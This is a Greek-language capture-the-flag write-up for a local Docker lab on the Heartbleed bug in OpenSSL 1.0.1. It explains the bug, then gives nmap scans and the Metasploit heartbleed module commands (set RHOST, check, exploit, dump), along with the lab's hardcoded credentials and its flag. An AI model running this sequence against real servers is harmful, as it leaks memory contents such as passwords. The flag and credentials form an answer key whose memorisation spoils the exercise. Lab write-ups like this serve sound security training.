Η ευπάθεια στη συγκεκριμένη άσκηση ονομάζεται heartbleed. Βρίσκεται συγκεκριμένα στην έκδοση 1.0.1 του Openssl και συγκεκριμένα
στο "heartbeat" που ήταν component στο πρωτόκολλο TLS/SSL. Κατά το heartbeat, ένας υπολογιστής έστελνε ένα κρυπτογραφημένο μήνυμα
στον άλλον και περίμενε απάντηση. Ο υπολογιστής που λάμβανε το μήνυμα, το ξαναέστελνε πίσω στον άλλον υπολογιστή επιβεβαιώνοντας
έτσι ότι λειτουργεί ακόμα. Όμως η έκδοση 1.0.1 της Openssl είχε ένα σημαντικό λάθος. Δεν είχε έλεγχο για να επιβεβαιώνει ότι
το μήκος μηνύματος που στέλνει ο ένας υπολογιστής στον άλλον, ήταν όντως το σωστό μήκος. Αυτό σημαίνει ότι αν ο υπολογιστής έλεγε
ότι το μήνυμα έχει μήκος 40 ΚΒ ένω στην πραγματικότητα ήταν 20 KB, ο υπολογιστής που λάμβανε το μήνυμα θα έφτιαχνε έναν buffer μήκους
40 KB, θα έβαζε μέσα τα 20 KB που ήταν το πραγματικό περιεχόμενο του μηνύματος και τα υπόλοιπα 20 KB θα ήταν επιπλέον δεδομένα που
είχε ο υπολογιστής στη μνήμη του εκείνη τη στιγμή (εκτός άλλων και ονόματα χρήστη ή κωδικούς)

Στην παρούσα άσκηση έχει φτιαχτεί περιβάλλον σε Docker με την κατάλληλη έκδοση Openssl που έχει την ευπάθεια. 
Υπάρχει ένας Nginx εξυπηρετητής που λειτουργεί ως reverse proxy για την εφαρμογή node.js που περιλαμβάνει ένα απλό
login form. Χρησιμοποιεί SSL/TLS self-signed πιστοποιητικα για την επικοινωνία.

Αφού ξεκινήσουμε την άσκηση πηγαίνουμε στο https://localhost:1500.
Δεν γνωρίζουμε το username και το password.
Παρ'ολ'αυτά, αν κοιτάξουμε στα αρχεία της εφαρμογής και συγκεκριμένα στο αρχείο app.js μπορούμε να εντοπίσουμε
τα σωστά στοιχεία αφού δεν είναι προστατευμένα σε βάση.
Βλέπουμε ότι το username είναι admin και το password είναι secret
Πληκτρολογώντας τα στο login form, μπαίνουμε στο index.
Δεν βλέπουμε κάτι το ενδιαφέρον.
Το επόμενο βήμα είναι να κάνουμε έλεγχο των διαθέσιμων port μέσω του nmap
Χρησιμοποιώντας την εντολή :
nmap -sV 192.168.1.5 -p 1500
Κάνουμε scan στην target ip και το port ενεργοποιώντας το version detection για να δούμε τι services τρέχουν και σε τι έκδοση.
Το αποτέλεσμα είναι αυτό :
1500/tcp open  ssl/http nginx 1.10.2
Βλέποντας ότι λειτουργεί με ssl μπορούμε να ξανατρέχουμε την εντολή, αλλά αυτή τη φορά με την παράμετρο -sC για να δούμε περισσότερες
πληροφορίες για τo service :
nmap -sC 192.168.1.5 -p 1500
Στο ssl-cert βλέπουμε την λέξη "heartbleed". Οπότε πλέον ξέρουμε τι πρέπει να κάνουμε.
Μπαίνουμε στο metasploit με την εντολή ./msfconsole.
search heartbleed
use 1
set RHOST 192.168.1.5
set RPORT 1500
set VERBOSE true (για να πάρουμε πιο λεπτομερή ανάλυση του output)
check
Βλέπουμε στην απάντηση ότι ο στόχος φαίνεται ευπαθής.
exploit
Βλέπουμε πολλές πληροφορίες αλλά είναι δύσκολο να βγάλουμε άκρη.
Πληκτρολογούμε dump για να αποθηκευτούν σε αρχείο.
dump
Ανοίγουμε το αρχείο :
cat /root/.msf4/loot/20231122042330_default_192.168.1.5_openssl.heartble_997276.bin

Και βλέπουμε στο X-Heartbleed-Challenge τη σημαία :
FLAG{L0s1ngBl00d}
